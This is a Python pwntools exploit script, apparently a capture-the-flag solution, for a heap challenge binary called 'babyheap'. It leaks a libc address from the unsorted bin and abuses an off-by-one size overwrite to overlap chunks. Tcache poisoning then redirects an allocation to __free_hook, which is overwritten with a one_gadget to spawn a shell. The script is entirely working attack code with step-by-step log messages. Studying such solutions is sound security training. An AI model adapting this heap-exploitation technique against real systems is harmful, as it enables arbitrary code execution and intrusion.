#!/usr/bin/env python

from pwn import *

context(os="linux", arch="amd64")
context.terminal = ["terminator", "-e"]
#context.log_level = "debug"

p = process("./babyheap")
libc = ELF("./libc.so")

def Malloc(size, content):
    log.info("Malloc({0})".format(size))
    p.sendlineafter("Command:\n> ", "M") 
    p.sendlineafter("Size:\n> ", str(size))
    p.sendlineafter("Content:\n> ", content)

def Free(index):
    log.info("Free({0})".format(index))
    p.sendlineafter("Command:\n> ", "F")
    p.sendlineafter("Index:\n> ", str(index))

def Show(index):
    log.info("Show({0})".format(index))
    p.sendlineafter("Command:\n> ", "S")
    p.sendlineafter("Index:\n> ", str(index))

if args.GDB:
    gdb.attach(p)

# 1. Info Leak
log.info("Allocate 7 chunks to fill Tcache when freed")
for i in range(7):
	Malloc(0x178, "A")

log.info("Next chunk will go to the unsorted bin")
Malloc(0x178, "B")

log.info("Next chunk prevents top-chunk consolidation")
Malloc(0x178, "C")

log.info("Free the first 8 chunks")
for i in range(8):
	Free(i)

log.info("Next allocation will be served from the unsorted bin")
Malloc(0xf8,"")

log.info("Print the chunk to leak the address")
Show(0)

leaked_address = u64(p.recvline()[:-1].ljust(8, '\x00'))
log.info("Leaked Address = %s" % hex(leaked_address))

# 2. Calculate Libc Base
libc.address = leaked_address - 0x1e4e10
log.info("Libc Base = %s" % hex(libc.address))

# 3. Prepare for the Tcache Poisoning Attack
log.info("Make space in the tcache bin for the enlarged chunk")
Malloc(0x178, "1") #1

# 4. Tcache Poisoning Attack
log.info("Begin Tcache Poisoning by allocating three chunks")
Malloc(0xf8, "2"*0xf8)
Malloc(0xf8, "3"*0xf8)
Malloc(0xf8, "4"*0xf8)

log.info("Free third (index4) and first chunk (index2) ")
Free(4)
Free(2)

log.info("Modify the size field of the second chunk (index 3) using the off-by-one vulnerability")
Malloc(0xf8, "A"*0xf8 + "\x81")

log.info("Free second chunk (index 3) to overlap the 3rd chunk")
Free(3)

log.info("Modify third chunk's metadata (index 4 currently in the tcache), point FD to free hook")
#Malloc(0x178, cyclic(0x178, n=8))
Malloc(0x178, "B"*0x100 + p64(libc.symbols["__free_hook"]).strip("\x00"))

log.info("The next allocation will return a free chunk pointing to free hook")
Malloc(0xf8, "")

one_gadget = libc.address + 0xe2383
log.info("OneGadget = %s" % hex(one_gadget))

Malloc(0xf8, p64(one_gadget).strip("\x00"))
Free(1)

p.interactive()

